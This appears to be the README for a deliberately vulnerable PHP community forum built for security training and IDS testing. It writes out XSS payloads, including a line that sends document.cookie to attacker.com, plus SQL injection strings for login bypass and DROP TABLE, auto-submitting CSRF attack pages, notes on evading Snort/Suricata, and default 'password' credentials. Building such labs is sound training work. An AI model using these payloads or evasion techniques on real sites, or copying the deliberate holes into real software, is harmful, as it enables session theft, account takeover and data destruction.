# Forum Masyarakat

Sistem forum masyarakat yang dibuat untuk keperluan penelitian keamanan. Sistem ini **sengaja dibuat vulnerable** terhadap berbagai serangan XSS, SQL Injection, dan CSRF untuk keperluan testing dan pembelajaran.

## ⚠️ PERINGATAN KEAMANAN

**SISTEM INI SENGAJA VULNERABLE!** 
- Jangan gunakan di production
- Hanya untuk keperluan penelitian dan pembelajaran
- Mengandung celah keamanan yang disengaja

## 🚀 Fitur

### Fitur Forum
- **Sistem User Management**: Register, login, profile management
- **Role-based Access**: Admin, moderator, dan user biasa
- **Kategori Postingan**: Sistem kategorisasi yang lengkap
- **Postingan dan Balasan**: Sistem diskusi yang interaktif
- **Search Functionality**: Pencarian postingan
- **Admin Panel**: Dashboard administrasi lengkap

### Fitur Keamanan (Intentionally Vulnerable)
- **XSS Vulnerabilities**: Berbagai vector XSS di multiple endpoint
- **SQL Injection**: Query yang vulnerable di search, login, dan crud operations
- **CSRF**: Tidak ada token protection di form-form critical
- **Information Disclosure**: Error messages yang expose database details
- **Session Management Issues**: Weak session handling

## 🎯 Vulnerability Features

### XSS (Cross-Site Scripting)
1. **Stored XSS** di postingan dan balasan
2. **Reflected XSS** di search functionality
3. **DOM-based XSS** di client-side JavaScript
4. **XSS di admin panel** untuk privilege escalation

### SQL Injection
1. **Authentication bypass** di login form
2. **Search injection** di fungsi pencarian
3. **Second-order injection** di profile updates
4. **Blind SQL injection** di berbagai parameter

### CSRF (Cross-Site Request Forgery)
1. **No CSRF tokens** di semua form
2. **State-changing operations** tanpa verification
3. **Admin actions** yang bisa di-CSRF
4. **Password changes** tanpa verification

### Evasion Techniques

Sistem ini menggunakan berbagai teknik untuk **menghindari deteksi** Snort/Suricata:

#### XSS Evasion
- Character encoding (hex, base64)
- JavaScript concatenation
- Event handler obfuscation
- DOM manipulation techniques
- localStorage/sessionStorage exploitation

#### SQL Injection Evasion
- Comment-based bypass (`/**/`)
- Case variation
- Space to comment substitution
- String concatenation
- Stored procedure exploitation

#### CSRF Evasion
- No token validation
- GET requests for state changes
- JSON-based CSRF
- File upload CSRF

## 📁 Struktur File

```
Musywar/
├── index.php                 # Halaman utama
├── login.php                 # Halaman login (vulnerable)
├── register.php              # Registrasi user
├── post.php                  # Detail postingan (XSS vulnerable)
├── create-post.php           # Buat postingan baru
├── search.php                # Search functionality (SQLi vulnerable)
├── search-ajax.php           # AJAX search (XSS + SQLi)
├── submit-comment.php        # Submit balasan (vulnerable)
├── profile.php               # User profile (multiple vulns)
├── logout.php                # Logout handler
├── track.php                 # Tracking pixel (data leakage)
├── admin/
│   ├── index.php             # Admin dashboard
│   ├── users.php             # User management (vulnerable)
│   └── posts.php             # Post management (vulnerable)
├── assets/
│   ├── css/style.css         # Styling
│   └── js/main.js            # JavaScript (vulnerable functions)
├── config/
│   └── database.php          # Database connection
├── includes/
│   └── functions.php         # Vulnerable helper functions
└── database/
    └── schema.sql            # Database schema
```

## 🛠️ Setup Instructions

### Prerequisites
- PHP 7.4+ dengan MySQL
- Web server (Apache/Nginx)
- Laragon/XAMPP/WAMP untuk development

### Installation

1. **Clone/Copy** file ke web directory:
   ```bash
   # Jika menggunakan git
   git clone <repository> c:/laragon/www/Musywar
   
   # Atau copy manual ke folder web server
   ```

2. **Database Setup**:
   ```bash
   # Buat database
   mysql -u root -p -e "CREATE DATABASE forum_masyarakat"
   
   # Import schema
   mysql -u root -p forum_masyarakat < database/schema.sql
   ```

3. **Configuration**:
   - Edit `config/database.php` sesuai setting database Anda
   - Pastikan permission folder `logs/` dan `assets/` writable

4. **Default Accounts**:
   - **Admin**: username `admin`, password `password`
   - **Moderator**: username `moderator`, password `password`
   - **User**: username `john_doe`, password `password`

## 🧪 Testing Vulnerabilities

### XSS Testing

1. **Basic XSS di Postingan**:
   ```html
   <img src=x onerror=alert('XSS')>
   ```

2. **Advanced XSS dengan Evasion**:
   ```html
   <img src="x" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
   ```

3. **DOM XSS via URL**:
   ```
   post.php?id=1&msg=<img src=x onerror=alert(document.cookie)>
   ```

4. **Stored XSS via Create Post**:
   ```html
   <!-- Di form create-post.php -->
   <script>alert('Stored XSS')</script>
   <img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
   ```

5. **XSS di Preview Function**:
   ```
   create-post.php?xss=<script>alert('DOM XSS')</script>
   ```

### SQL Injection Testing

1. **Authentication Bypass**:
   ```
   Username: admin' OR '1'='1' -- 
   Password: anything
   ```

2. **Search Injection**:
   ```
   search.php?q=' UNION SELECT 1,2,3,4,user(),database(),-- 
   ```

3. **Second-order Injection**:
   ```
   Update profile dengan: '; DROP TABLE users; -- 
   ```

### CSRF Testing

#### 1. **Admin User Deletion Attack**
Buat file HTML malicious untuk menghapus user:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Website</title>
</head>
<body>
    <h1>Welcome to Our Site!</h1>
    <p>Loading content...</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="http://localhost/Musywar/admin/users.php" method="POST" style="display:none;">
        <input name="action" value="delete_user">
        <input name="user_id" value="5">
    </form>
    
    <script>
        // Auto-submit form when page loads
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
```

#### 2. **Post Creation CSRF Attack**
Membuat postingan malicious sebagai user lain:
```html
<form action="http://localhost:8000/create-post.php" method="POST">
    <input type="hidden" name="title" value="🚨 CSRF ATTACK POST">
    <input type="hidden" name="content" value="<script>alert('CSRF+XSS Attack Success!')</script><p>This post was created via CSRF attack!</p>">
    <input type="hidden" name="category" value="1">
    <script>document.forms[0].submit();</script>
</form>
```

#### 3. **Auto-Submit CSRF dengan Parameter**:
```
http://localhost:8000/create-post.php?test_title=HACKED&test_content=<script>alert('CSRF')</script>&test_category=1&auto_submit=true
```

#### 4. **Testing dengan Browser**
Langkah-langkah manual testing:
1. Login sebagai admin di browser pertama
2. Buka file CSRF malicious di browser/tab kedua
3. Kembali ke browser admin dan cek perubahan
4. Monitor network traffic untuk konfirmasi serangan

#### **CSRF Protection Bypass Techniques:**
- **Double Submit Cookie**: Bypass dengan prediksi token
- **SameSite Cookie**: Exploit pada konfigurasi yang salah
- **Referer Header**: Bypass dengan meta refresh atau JavaScript
- **Origin Header**: Spoof menggunakan data: URI atau null origin

## 🎓 Learning Objectives

Sistem ini cocok untuk:
- **Security researchers** yang ingin testing detection tools
- **Students** yang belajar web application security
- **Penetration testers** untuk practice
- **IDS/IPS developers** untuk testing rules

## ⚡ Advanced Features

### Custom Vulnerability Chains
1. **XSS → Session Hijacking → Privilege Escalation**
2. **SQLi → Information Disclosure → Admin Access**
3. **CSRF → Account Takeover → Data Manipulation**

### Logging and Monitoring
- Vulnerable logging in `logs/` directory
- Tracking pixels for data collection
- Session activity monitoring (vulnerable)

## 📚 Educational Use

### Recommended Attack Scenarios:
1. **Basic Web App Pentesting**
2. **IDS/IPS Evasion Testing**
3. **WAF Bypass Techniques**
4. **Social Engineering Attack Vectors**

### Security Concepts Covered:
- Input validation failures
- Output encoding issues
- Authentication/authorization flaws
- Session management vulnerabilities
- Business logic errors

## 🚨 Disclaimer

**IMPORTANT**: Sistem ini dibuat khusus untuk keperluan pendidikan dan penelitian keamanan. Vulnerability yang ada adalah disengaja dan tidak boleh digunakan di lingkungan production.

**Author**: Jarvis
**Created**: 2025
**Purpose**: Educational & Security Research

---

**Happy Hacking! 🐱‍💻**

*Remember: Use this knowledge responsibly and only for legitimate security research and education purposes.*
